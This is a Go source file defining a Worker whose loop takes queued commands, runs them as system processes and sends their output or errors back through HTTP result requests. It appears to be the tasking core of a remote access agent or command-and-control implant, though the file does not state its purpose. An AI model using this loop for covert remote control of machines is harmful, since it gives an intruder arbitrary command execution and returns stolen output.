package internal

import (
	"os/exec"
	"time"
)

type Worker struct {
	Kill     bool
	HttpConn *HttpConn
	ReqQueue *SafeRequestQueue
	CmdQueue *SafeCommandQueue
}

func (w *Worker) Run() {
	for !w.Kill {
		time.Sleep(100 * time.Millisecond)
		if command := w.CmdQueue.GetNext(); command != nil {
			operation := command[0]
			arguments := command[1:]
			cmd := exec.Command(operation, arguments...)
			ret, err := cmd.CombinedOutput()
			if err != nil {
				newReq, err := w.HttpConn.NewResultRequest([]byte(err.Error()))
				if err != nil {
					continue
				}
				w.ReqQueue.Add(newReq)
				continue
			}
			newReq, err := w.HttpConn.NewResultRequest(ret)
			if err != nil {
				continue
			}
			w.ReqQueue.Add(newReq)
		}
	}
	return
}
